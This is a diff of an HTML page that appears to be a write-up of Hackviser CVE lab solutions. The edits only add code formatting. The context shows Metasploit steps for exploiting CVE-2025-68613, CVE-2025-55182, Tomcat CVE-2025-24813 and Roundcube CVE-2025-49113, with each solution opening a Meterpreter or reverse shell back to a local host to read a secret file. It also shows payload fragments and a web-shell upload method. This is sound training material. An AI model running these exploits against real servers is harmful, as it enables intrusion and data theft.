@@ -38,7 +38,7 @@ Verify remote code execution by running the id command.</p>
 })() }}
 ```
 
-<p class="mb-3">Credentials: HTTP Port: <code>5678</code>, Username: <code>admin@local.hv</code>, Password: <code>Password1337!</code> <br />Exploit the vulnerability to read the /secret.txt file on the server. What is the secret content?</p>
+<p class="mb-3">Credentials: HTTP Port: <code>5678</code>, Username: <code>admin@local.hv</code>, Password: <code>Password1337!</code> <br />Exploit the vulnerability to read the <code>/secret.txt</code> file on the server. What is the secret content?</p>
 <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2025-68613</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
 <img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-68613/cvelabs_cve-2025-68613_image1.png" alt="CVE-2025-68613 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
 <p class="mb-3">Enter <code>set PASSWORD Password 1337!</code>, <code>set RHOSTS [target_IP]</code>, <code>set USERNAME admin@local.hv</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we enter <code>shell</code> to execute shell commands for reading secret.txt.</p>
@@ -67,7 +67,7 @@ Content-Disposition: form-data; name="1"
 "$@0"
 ------WebKitFormBoundary7MA4YWxkTrZu0gW--
 ```
-<p class="mb-3">Note: The target machine has no internet access (air-gapped). You must set up a local listener (HTTP/POST) and direct the OOB request to your local IP address. Exploit the vulnerability to read the /secret.txt file on the server. What is the secret content?</p>
+<p class="mb-3">Note: The target machine has no internet access (air-gapped). You must set up a local listener (HTTP/POST) and direct the OOB request to your local IP address. Exploit the vulnerability to read the <code>/secret.txt</code> file on the server. What is the secret content?</p>
 <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2025-55182</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
 <img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-55182/cvelabs_cve-2025-55182_image1.png" alt="CVE-2025-55182 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
 <p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A command shell session will open to execute commands for reading secret.txt.</p>
@@ -76,7 +76,7 @@ Content-Disposition: form-data; name="1"
 <br />
 
 <h4 class="mb-2">3. Apache Tomcat 9.0.0-9.0.98/10.1.0-10.1.34/11.0.0-11.0.2 Remote Code Execution (CVE-2025-24813)</h4>
-<p class="mb-3">Apache Tomcat is an open-source web server and servlet container used to run Java-based web applications. This laboratory contains the CVE-2025-24813 vulnerability identified in Apache Tomcat versions 9.0.0-9.0.98, 10.1.0-10.1.34, and 11.0.0-11.0.2. This critical vulnerability arises from improper handling of partial PUT requests and flaws in the path equivalence mechanism. When write permissions are enabled on the default servlet and file-based session persistence is configured, the vulnerability allows attackers to perform remote code execution on the server. Attackers can upload JSP web shell files in chunks using the Content-Range header and execute arbitrary Java code through the session deserialization mechanism. What is the secret in the /secret.txt file?</p>
+<p class="mb-3">Apache Tomcat is an open-source web server and servlet container used to run Java-based web applications. This laboratory contains the CVE-2025-24813 vulnerability identified in Apache Tomcat versions 9.0.0-9.0.98, 10.1.0-10.1.34, and 11.0.0-11.0.2. This critical vulnerability arises from improper handling of partial PUT requests and flaws in the path equivalence mechanism. When write permissions are enabled on the default servlet and file-based session persistence is configured, the vulnerability allows attackers to perform remote code execution on the server. Attackers can upload JSP web shell files in chunks using the Content-Range header and execute arbitrary Java code through the session deserialization mechanism. What is the secret in the <code>/secret.txt</code> file?</p>
 <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2025-24813</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
 <img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-24813/cvelabs_cve-2025-24813_image1.png" alt="CVE-2025-24813 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
 <p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>, <code>set LHOST [local_IP]</code> and <code>set RPORT 80</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we enter <code>shell</code> to execute shell commands for reading secret.txt.</p>
@@ -189,7 +189,7 @@ CVE-2025-49113 is a critical vulnerability affecting all versions up to and incl
 <br />
 Roundcube username: <code>roundcube</code><br />
 Roundcube password: <code>rcpass</code><br />
-What is the secret inside the /secret.txt file?</p>
+What is the secret inside the <code>/secret.txt</code> file?</p>
 <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2025-49113</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
 <img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-49113/cvelabs_cve-2025-49113_image1.png" alt="CVE-2025-49113 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
 <p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>, <code>set USERNAME roundcube</code>, <code>set PASSWORD rcpass</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we enter <code>shell</code> to execute shell commands for reading secret.txt.</p>
